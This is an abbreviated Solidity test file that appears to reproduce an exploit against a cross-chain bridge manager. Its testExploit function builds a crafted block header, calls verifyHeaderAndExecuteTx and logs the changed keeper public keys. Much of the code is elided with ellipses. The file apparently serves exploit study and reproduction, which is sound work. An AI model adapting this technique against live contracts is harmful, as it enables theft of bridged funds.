...
interface IEthCrossChainManager {  
    function verifyHeaderAndExecuteTx(bytes memory proof, bytes memory rawHeader, bytes memory headerProof, bytes memory curRawHeader,bytes memory headerSig) external returns (bool);
}
...
contract ContractTest is DSTest {
    ...
    function testExploit() public {
        ...
        Header memory header = Header({
            version: 0, chainId: 0,
            timestamp: 1628587975,
            height: 11025028,
            consensusData: 6968744985048139056,
        ...
        emit log_named_bytes("changed CurEpochConPubKeyBytes", IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes());
